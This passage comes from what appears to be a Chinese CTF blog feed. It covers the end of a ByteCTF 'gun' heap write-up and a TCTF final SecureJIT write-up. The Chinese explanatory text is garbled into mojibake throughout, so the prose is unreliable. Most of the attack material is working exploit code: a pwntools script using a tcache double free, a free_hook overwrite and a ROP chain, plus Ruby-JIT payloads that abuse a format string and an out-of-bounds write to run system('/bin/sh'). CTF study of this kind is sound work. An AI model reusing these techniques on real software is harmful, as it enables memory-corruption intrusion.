ä¸ºé¢˜ç›®è®¾ç½®æœ‰æ²™ç®±ï¼Œæ²¡æœ‰åŠæ³•ä½¿ç”¨one_gadgetæ‹¿åˆ°shellï¼Œéœ€è¦è‡ªå·±æ„é€ ROPæ¥å®Œæˆåˆ©ç”¨ã€‚ç”±äºæœ‰heapåœ°å€ï¼Œæˆ‘ä»¬èƒ½ç”³è¯·chunkï¼ŒæŠŠROPå†™å…¥å…¶ä¸­ï¼Œåœ¨free_hookä¸­å¡«å…¥çš„gadgetè·³è½¬åˆ°ç›®æ ‡å †åœ°å€ä¸­æ‰§è¡ŒROPé“¾ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000008A754                 mov     rax, [rdi+0A0h]</span><br><span class="line">.text:000000000008A75B                 push    rbx</span><br><span class="line">.text:000000000008A75C                 mov     rbx, rdi</span><br><span class="line">.text:000000000008A75F                 mov     rdx, [rax+20h]</span><br><span class="line">.text:000000000008A763                 cmp     rdx, [rax+18h]</span><br><span class="line">.text:000000000008A767                 jbe     short loc_8A788</span><br><span class="line">.text:000000000008A769                 mov     rax, [rax+0E0h]</span><br><span class="line">.text:000000000008A770                 mov     esi, 0FFFFFFFFh</span><br><span class="line">.text:000000000008A775                 call    qword ptr [rax+18h]</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸€æ®µæœ‰ç”¨çš„gadgetï¼Œé€šè¿‡rdiæ§åˆ¶raxï¼Œraxåˆèƒ½æ§åˆ¶rdxã€‚æ‰§è¡Œfreeæ—¶çš„rdiåˆšå¥½æ˜¯è¦freeçš„æŒ‡é’ˆï¼Œè¿™é‡Œå°±å¯ä»¥æ˜¯æˆ‘ä»¬ç”³è¯·åˆ°çš„æ‹¿æ¥å†™ROPçš„chunkåœ°å€ã€‚</p><img src="/2020/10/26/2020-bytectf-gun/8.png"><p>å…‰æœ‰callè™½ç„¶èƒ½æ§åˆ¶ripï¼Œä½†rspæ— æ³•æ§åˆ¶åªèƒ½ä¾é å…¶ä»–gadgetï¼Œåœ¨èƒ½æ§åˆ¶rdxçš„æ¡ä»¶ä¸‹ï¼Œä½¿ç”¨<code>0x000000000005e650 : mov rsp, rdx ; ret</code>å°±èƒ½åŒæ—¶æ§åˆ¶ripå’Œrspåˆ°æˆ‘ä»¬æƒ³è¦çš„ä½ç½®ã€‚æœ€åchunkçš„å…·ä½“åœ°å€ï¼Œé€šè¿‡è°ƒè¯•çŸ¥é“æˆ‘ä»¬å‰é¢çš„æ“ä½œè®©heapåˆ°äº†0x870çš„åç§»ã€‚</p><img src="/2020/10/26/2020-bytectf-gun/9.png"><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>è¿™é‡Œå€Ÿç”¨äº†shiyhå¸ˆå‚…çš„exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./gun'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> args[<span class="string">'D'</span>]:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">'R'</span>]:</span><br><span class="line">    io = remote(<span class="string">'123.57.209.176'</span>, <span class="string">'30772'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(<span class="string">'./gun'</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shoot</span><span class="params">(time)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">b'Action&gt; '</span>)</span><br><span class="line">    io.sendline(<span class="string">'1'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b'Shoot time: '</span>)</span><br><span class="line">    io.sendline(str(time))</span><br><span class="line">    <span class="comment">#p.recvuntil('bullets left\n')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load</span><span class="params">(index)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">b'Action&gt; '</span>)</span><br><span class="line">    io.sendline(<span class="string">'2'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b'Which one do you want to load?'</span>)</span><br><span class="line">    io.sendline(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy</span><span class="params">(price,name)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">b'Action&gt; '</span>)</span><br><span class="line">    io.sendline(<span class="string">'3'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b'Bullet price: '</span>)</span><br><span class="line">    io.sendline(str(price))</span><br><span class="line">    io.recvuntil(<span class="string">b'Bullet Name: '</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quit</span><span class="params">()</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">b'Action&gt; '</span>)</span><br><span class="line">    io.sendline(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b'Your name: '</span>)</span><br><span class="line">io.sendline(<span class="string">b'shiyh'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    buy(<span class="number">0x80</span>,<span class="string">''</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    load(i)</span><br><span class="line">shoot(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># use unsorted bin leak libc and tcache leak heap</span></span><br><span class="line">buy(<span class="number">0x20</span>,<span class="string">''</span>)</span><br><span class="line">load(<span class="number">0</span>)</span><br><span class="line">shoot(<span class="number">1</span>)</span><br><span class="line">io.recvuntil(<span class="string">'Pwn! The '</span>)</span><br><span class="line">t = io.recvuntil(<span class="string">' bullet'</span>)[:<span class="number">-7</span>]</span><br><span class="line">libc_base = u64(t.ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>)) - <span class="number">0x1ebc60</span></span><br><span class="line">free_hook = libc_base + <span class="number">0x1EEB28</span></span><br><span class="line">log.info(<span class="string">'libc_base : %s'</span> % hex(libc_base))</span><br><span class="line">buy(<span class="number">0x80</span>,<span class="string">''</span>)</span><br><span class="line">load(<span class="number">0</span>)</span><br><span class="line">shoot(<span class="number">1</span>)</span><br><span class="line">io.recvuntil(<span class="string">'Pwn! The '</span>)</span><br><span class="line">t = io.recvuntil(<span class="string">' bullet'</span>)[:<span class="number">-7</span>]</span><br><span class="line">heap = u64(t.ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))<span class="number">-1008</span></span><br><span class="line">log.info(<span class="string">'heap : %s'</span> % hex(heap))</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="comment"># full tcache</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">    buy(<span class="number">0x20</span>,<span class="string">''</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    load(i+<span class="number">2</span>)</span><br><span class="line">shoot(<span class="number">7</span>)</span><br><span class="line">load(<span class="number">0</span>)</span><br><span class="line">shoot(<span class="number">3</span>)  <span class="comment"># for double free</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    buy(<span class="number">0x20</span>,<span class="string">''</span>)</span><br><span class="line">buy(<span class="number">0x20</span>,p64(free_hook))<span class="comment">#7</span></span><br><span class="line">buy(<span class="number">0x20</span>,<span class="string">''</span>)<span class="comment">#8</span></span><br><span class="line">buy(<span class="number">0x20</span>,<span class="string">''</span>)<span class="comment">#9</span></span><br><span class="line"><span class="comment">### ROP</span></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x0000000000026b72</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x0000000000027529</span></span><br><span class="line">pop_rdx_rbx = libc_base + <span class="number">0x0000000000162866</span></span><br><span class="line">pop_rax = libc_base + <span class="number">0x000000000004a550</span></span><br><span class="line">syscall = libc_base + <span class="number">0x00000000000E62F9</span></span><br><span class="line">flag_addr = heap + <span class="number">2144</span> + <span class="number">0x10</span></span><br><span class="line">buf = heap + <span class="number">2144</span> + <span class="number">8</span> +<span class="number">0x10</span></span><br><span class="line">payload = <span class="string">b'flag'</span> + p32(<span class="number">0</span>) + <span class="string">b'\x00'</span>*<span class="number">0x18</span> + p64(flag_addr + <span class="number">0x100</span>) + <span class="string">b'\x00'</span>*<span class="number">0x78</span> <span class="comment">#0xa0</span></span><br><span class="line">payload += p64(flag_addr) + <span class="string">b'\x00'</span>*<span class="number">0x38</span> <span class="comment">#0xe0</span></span><br><span class="line">payload += p64(flag_addr + <span class="number">0xe0</span>) + <span class="string">b'\x00'</span>*<span class="number">0x10</span> + p64(libc_base + <span class="number">0x000000000005e650</span>) <span class="comment">#0x100</span></span><br><span class="line">ROPchain = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="number">0</span>) + p64(pop_rdx_rbx) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(pop_rax) + p64(<span class="number">2</span>) + p64(syscall)</span><br><span class="line">ROPchain += p64(pop_rdi) + p64(<span class="number">3</span>) + p64(pop_rsi) + p64(buf) + p64(pop_rdx_rbx) + p64(<span class="number">0x30</span>) + p64(<span class="number">0</span>) + p64(pop_rax) + p64(<span class="number">0</span>) + p64(syscall)</span><br><span class="line">ROPchain += p64(pop_rdi) + p64(<span class="number">1</span>) + p64(pop_rsi) + p64(buf) + p64(pop_rdx_rbx) + p64(<span class="number">0x30</span>) + p64(<span class="number">0</span>) + p64(pop_rax) + p64(<span class="number">1</span>) + p64(syscall)</span><br><span class="line">payload += ROPchain</span><br><span class="line">buy(<span class="number">0x300</span>,payload)<span class="comment">#10</span></span><br><span class="line">load(<span class="number">10</span>)</span><br><span class="line"><span class="comment">### </span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">gadget = libc_base + <span class="number">0x8A754</span></span><br><span class="line">buy(<span class="number">0x20</span>,p64(gadget))</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">shoot(<span class="number">1</span>)  <span class="comment"># free(ptr10) rdi=chunk10_addr</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0x000000000005e650 : mov rsp, rdx ; ret</span></span><br><span class="line"><span class="string">0x0000000000026b72 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x0000000000027529 : pop rsi ; ret</span></span><br><span class="line"><span class="string">0x0000000000162866 : pop rdx ; pop rbx ; ret</span></span><br><span class="line"><span class="string">0x000000000004a550 : pop rax ; ret</span></span><br><span class="line"><span class="string">.text:000000000008A754                 mov     rax, [rdi+0A0h]</span></span><br><span class="line"><span class="string">.text:000000000008A75B                 push    rbx</span></span><br><span class="line"><span class="string">.text:000000000008A75C                 mov     rbx, rdi</span></span><br><span class="line"><span class="string">.text:000000000008A75F                 mov     rdx, [rax+20h]</span></span><br><span class="line"><span class="string">.text:000000000008A763                 cmp     rdx, [rax+18h]</span></span><br><span class="line"><span class="string">.text:000000000008A767                 jbe     short loc_8A788</span></span><br><span class="line"><span class="string">.text:000000000008A769                 mov     rax, [rax+0E0h]</span></span><br><span class="line"><span class="string">.text:000000000008A770                 mov     esi, 0FFFFFFFFh</span></span><br><span class="line"><span class="string">.text:000000000008A775                 call    qword ptr [rax+18h]</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;è¿™å‘¨æ‰“äº†ä¸€ä¸‹ByteCTFï¼Œå‘ç°å·®è·è¿˜æ˜¯å¾ˆå¤§çš„ï¼Œç°åœ¨çš„å¾ˆå¤šå †èœå•é¢˜éƒ½ä¸Š2.31ï¼Œæ–°ç‰ˆæœ¬çš„é¢˜ç›®éœ€è¦å¤šç†Ÿæ‚‰ç†Ÿæ‚‰ã€‚&lt;/p&gt;
&lt;h2 id=&quot;åˆ†æ&quot;&gt;&lt;a href=&quot;#åˆ†æ&quot; class=&quot;headerlink&quot; title=&quot;åˆ†æ&quot;&gt;&lt;/a&gt;åˆ†æ&lt;/h2&gt;&lt;p&gt;checksec
      
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="CTF" scheme="https://hurricane618.me/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2020 TCTF final SecureJIT writeup</title>
    <link href="https://hurricane618.me/2020/10/12/2020-tctf-final-jit/"/>
    <id>https://hurricane618.me/2020/10/12/2020-tctf-final-jit/</id>
    <published>2020-10-12T01:27:17.000Z</published>
    <updated>2020-10-12T01:27:17.873Z</updated>
    
    <content type="html"><![CDATA[<p>ç¬¬ä¸€æ¬¡æ‰“final è¢«æ‰“çš„å¤´éƒ½ç‚¸äº†ï¼Œ555555ã€‚è¿‡å»ä¸‰å‘¨äº†ï¼Œè¿˜æ˜¯æ°´ä¸€ä¸‹è¿™é“ç­¾åˆ°é¢˜ã€‚</p><h2 id="é¢˜ç›®æƒ…å†µ"><a href="#é¢˜ç›®æƒ…å†µ" class="headerlink" title="é¢˜ç›®æƒ…å†µ"></a>é¢˜ç›®æƒ…å†µ</h2><p>ä½œè€…æåˆ°äº†ä¸€ä¸ªrubyçš„jitâ€”â€”rubiï¼Œå…¶ä¸­æ‰“äº†patchï¼Œè®©æ‰§è¡Œä»£ç çš„åŒºåŸŸå˜æˆä¸å¯å†™çš„æƒ…å†µã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/engine.c b/engine.c</span><br><span class="line">index 79e83d2..2350d59 100644</span><br><span class="line">--- a/engine.c</span><br><span class="line">+++ b/engine.c</span><br><span class="line">@@ -137,6 +137,11 @@ static int execute(char *source)</span><br><span class="line">init();</span><br><span class="line">lex(source);</span><br><span class="line">parser();</span><br><span class="line">+ long memsz = 0xFFFF + 1;</span><br><span class="line">+ if (mprotect(ntvCode, memsz, PROT_READ | PROT_EXEC)) &#123;</span><br><span class="line">+ perror(&quot;mprotect&quot;);</span><br><span class="line">+ exit(1);</span><br><span class="line">+ &#125;</span><br><span class="line">((int (*)(int *, void **)) ntvCode)(0, funcTable);</span><br><span class="line">dispose();</span><br><span class="line">return 0;</span><br></pre></td></tr></table></figure><p>å¯¹äºé˜²æŠ¤ï¼Œæœ‰ä¸€ä¸ªæ€è·¯å°±æ˜¯å¯»æ‰¾é‚£äº›æ²¡æœ‰è¢«ä¿æŠ¤çš„åœ°æ–¹ï¼Œè¿™ä¸ªåªä¿æŠ¤äº†rubyä»£ç åŒºåŸŸï¼Œæ²¡æœ‰ä¿æŠ¤å…¶ä»–çš„æ ˆæˆ–è€…ä¸€äº›ç‰¹æ®Šç¬¦å·æ¯”å¦‚free_hookå’Œmalloc_hookã€‚</p><h2 id="æ¼æ´ç‚¹"><a href="#æ¼æ´ç‚¹" class="headerlink" title="æ¼æ´ç‚¹"></a>æ¼æ´ç‚¹</h2><p>1.æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</p><img src="/2020/10/12/2020-tctf-final-jit/1.png"><p>2.å †æº¢å‡ºäºŒè¿ï¼Œåˆ†åˆ«æº¢å‡ºäº†å˜é‡åå’Œå‡½æ•°å</p><img src="/2020/10/12/2020-tctf-final-jit/2.png"><img src="/2020/10/12/2020-tctf-final-jit/3.png"><p>ä½†æ˜¯è¿™ä¸ªå †æº¢å‡ºæœ‰ç‚¹æ— ç”¨ï¼Œæº¢å‡ºä¹‹åæ— æ³•æœ‰æ•ˆæ§åˆ¶</p><p>3.æ•°ç»„ä»»æ„è¯»å†™</p><img src="/2020/10/12/2020-tctf-final-jit/4.png"><p>è¿™ä¸ªå¨åŠ›å¾ˆå¤§ï¼Œåˆ©ç”¨è¯»å–æ“ä½œè·å¾—libcåœ°å€ä¹‹åï¼Œå¯ä»¥ç›´æ¥æ”¹free_hookå’Œmalloc_hookã€‚</p><h2 id="æ–¹æ³•ä¸€-åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²"><a href="#æ–¹æ³•ä¸€-åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²" class="headerlink" title="æ–¹æ³•ä¸€ åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²"></a>æ–¹æ³•ä¸€ åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²</h2><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²å…ˆæ³„éœ²å‡ºlibcåœ°å€ï¼Œè¿™ä¸ªç¨‹åºç”±äºæ˜¯32ä½çš„ï¼Œæ‰€ä»¥ä¼šåœ¨æ ˆä¸Šå­˜å‚¨å˜é‡ï¼Œè¿™å°±ç»™äº†æˆ‘ä»¬å‘æ ˆç©ºé—´å†™æ•°æ®çš„æœºä¼šï¼Œå¯ä»¥è¾“å…¥å¾ˆå¤šå‚æ•°çš„printfï¼Œè¦†ç›–æ ˆç©ºé—´çš„æ•°æ®åŠ«æŒæ§åˆ¶æµã€‚</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">fp = fopen(<span class="string">"/tmp/t"</span>, <span class="string">"w"</span>)</span><br><span class="line">fprintf(fp, <span class="string">"%15$p %13$p"</span>)</span><br><span class="line">fclose(fp)</span><br><span class="line"><span class="symbol">text:</span>string = Array(<span class="number">100</span>)</span><br><span class="line">fp = fopen(<span class="string">"/tmp/t"</span>, <span class="string">"r"</span>)</span><br><span class="line">fgets(text, <span class="number">100</span>, fp)</span><br><span class="line">fclose(fp)</span><br><span class="line">printf <span class="string">"%s\n"</span>, text</span><br><span class="line"><span class="symbol">base:</span>int = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i = <span class="number">2</span>, i &lt; <span class="number">10</span>, i++</span><br><span class="line">value = text[i] - <span class="string">'0'</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">'a'</span> &lt;= text[i] <span class="keyword">and</span> text[i] &lt;= <span class="string">'z'</span></span><br><span class="line">value = text[i] - <span class="string">'a'</span> + <span class="number">10</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">base = base * <span class="number">16</span> + value</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="symbol">libc:</span>int = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i = <span class="number">13</span>, i &lt; <span class="number">21</span>, i++</span><br><span class="line">value = text[i] - <span class="string">'0'</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">'a'</span> &lt;= text[i] <span class="keyword">and</span> text[i] &lt;= <span class="string">'z'</span></span><br><span class="line">value = text[i] - <span class="string">'a'</span> + <span class="number">10</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">libc = libc * <span class="number">16</span> + value</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="comment">#libc = libc - 1001401 # 1001081</span></span><br><span class="line">libc = libc - <span class="number">1001081</span></span><br><span class="line"><span class="comment">#sys = libc + 250448 # 250368</span></span><br><span class="line">sys = libc + <span class="number">250368</span></span><br><span class="line"><span class="comment">#bin_sh = libc + 1565647 # 1564879</span></span><br><span class="line">bin_sh = libc + <span class="number">1564879</span></span><br><span class="line">gadget = <span class="number">0</span></span><br><span class="line">printf <span class="string">"%x\n"</span>, base</span><br><span class="line">printf <span class="string">"%x\n"</span>, libc</span><br><span class="line">printf <span class="string">"%d"</span>, gadget, gadget, gadget, gadget, gadget, bin_sh, sys, gadget, gadget, sys, gadget, gadget, gadget, gadget, gadget, sys, gadget, bin_sh</span><br></pre></td></tr></table></figure><h2 id="æ–¹æ³•äºŒ-ç›´æ¥åˆ©ç”¨æ•°ç»„ä»»æ„è¯»å†™"><a href="#æ–¹æ³•äºŒ-ç›´æ¥åˆ©ç”¨æ•°ç»„ä»»æ„è¯»å†™" class="headerlink" title="æ–¹æ³•äºŒ ç›´æ¥åˆ©ç”¨æ•°ç»„ä»»æ„è¯»å†™"></a>æ–¹æ³•äºŒ ç›´æ¥åˆ©ç”¨æ•°ç»„ä»»æ„è¯»å†™</h2><p>é¦–å…ˆåœ¨è¿›å…¥rubyæ‰§è¡Œç©ºé—´çš„æ—¶å€™ï¼Œeaxä¸ºå‡½æ•°è¡¨åœ°å€ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥ç”¨<code>[3]</code>è·å¾—åˆ°mallocçš„åœ°å€ï¼Œè¿™æ ·æˆ‘ä»¬å°±èƒ½å¤Ÿè®¡ç®—å‡ºlibcåœ°å€ï¼Œå¾—åˆ°<code>free_hook</code>çš„åœ°å€ï¼Œç›´æ¥å†™å…¥systemï¼Œç„¶åfree(â€˜/bin/shâ€™)æ‹¿åˆ°shellã€‚</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">x = [<span class="number">3</span>]</span><br><span class="line"><span class="symbol">a:</span>string = Array(<span class="number">100</span>)</span><br><span class="line">a[x - a - <span class="number">503040</span> + <span class="number">1939664</span>] = x - <span class="number">503040</span> + <span class="number">250448</span></span><br><span class="line">free(<span class="string">"/bin/sh"</span>)</span><br></pre></td></tr></table></figure><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>çœ‹ç¨‹åºçš„æ—¶å€™ï¼Œå¤šæ³¨æ„ä¸€äº›å±é™©æ“ä½œï¼Œæ¯”å¦‚å­—ç¬¦ä¸²è¯»å†™ï¼Œå†…å­˜å—è¯»å†™ï¼Œæ‚¬æŒ‚æŒ‡é’ˆé—®é¢˜ç­‰ç­‰ã€‚åœ¨æ£€æŸ¥ä¿æŠ¤æœºåˆ¶çš„æ—¶å€™ï¼Œæ³¨æ„å®ƒçš„ä¿æŠ¤èŒƒå›´å’Œä¿æŠ¤åŸç†ï¼Œåƒè¿™é“é¢˜åªä¿æŠ¤äº†rubyä»£ç æ‰§è¡ŒåŒºåŸŸæˆ‘ä»¬å¯ä»¥åœ¨å…¶ä»–åœ°æ–¹å†™æ•°æ®æ¥ç»•è¿‡ï¼Œä¹‹å‰åšçš„ä¸€é“ptraceæ²™ç®±é¢˜ç›®ï¼Œç»•è¿‡å®ƒçš„æ–¹æ³•æ˜¯åˆ©ç”¨ç³»ç»Ÿä¸­æ–­<code>int3</code>ï¼Œå¼ºåˆ¶è¿›å…¥ä¸€æ¬¡ç³»ç»Ÿä¸­æ–­è®©ptraceçš„æ£€æµ‹ç‚¹å¤±æ•ˆï¼Œä»è€Œç»•è¿‡å¯¹ç³»ç»Ÿè°ƒç”¨çš„æ£€æµ‹ã€‚</p><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg2NjQ2NzU3Ng==&amp;mid=2247484959&amp;idx=1&amp;sn=5919e45456c131ac9392d875c34e0719&amp;chksm=ce4b2d88f93ca49e1771586284fe75e12fdbfa63b1f6c7e6e5ae01ada49a20cca0aa7a807b8a&amp;mpshare=1&amp;scene=23&amp;srcid=0929Rl2bA4BazcX9HRFNQeKd&amp;sharer_sharetime=1601383291632&amp;sharer_shareid=2bfea3a1914646ead630f87d9dbd3069%23rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=Mzg2NjQ2NzU3Ng==&amp;mid=2247484959&amp;idx=1&amp;sn=5919e45456c131ac9392d875c34e0719&amp;chksm=ce4b2d88f93ca49e1771586284fe75e12fdbfa63b1f6c7e6e5ae01ada49a20cca0aa7a807b8a&amp;mpshare=1&amp;scene=23&amp;srcid=0929Rl2bA4BazcX9HRFNQeKd&amp;sharer_sharetime=1601383291632&amp;sharer_shareid=2bfea3a1914646ead630f87d9dbd3069%23rd</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;ç¬¬ä¸€æ¬¡æ‰“final è¢«æ‰“çš„å¤´éƒ½ç‚¸äº†ï¼Œ555555ã€‚è¿‡å»ä¸‰å‘¨äº†ï¼Œè¿˜æ˜¯æ°´ä¸€ä¸‹è¿™é“ç­¾åˆ°é¢˜ã€‚&lt;/p&gt;
&lt;h2 id=&quot;é¢˜ç›®æƒ…å†µ&quot;&gt;&lt;a href=&quot;#é¢˜ç›®æƒ…å†µ&quot; class=&quot;headerlink&quot; title=&quot;é¢˜ç›®æƒ…å†µ&quot;&gt;&lt;/a&gt;é¢˜ç›®æƒ…å†µ&lt;/h2&gt;&lt;p&gt;ä½œè€…æåˆ°äº†ä¸€ä¸ªrubyçš„
      
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="CTF" scheme="https://hurricane618.me/tags/CTF/"/>
    
      <category term="fmt" scheme="https://hurricane618.me/tags/fmt/"/>
    
  </entry>
  
  <entry>
    <title>2020å¼ºç½‘æ¯ å¼ºç½‘å…ˆé”‹ã®pwn</title>
    <link href="https://hurricane618.me/2020/09/15/2020qwb-qwxf-pwn/"/>
    <id>https://hurricane618.me/2020/09/15/2020qwb-qwxf-pwn/</id>
    <published>2020-09-15T11:57:54.000Z</published>
    <updated>2020-10-11T14:09:37.005Z</updated>
    
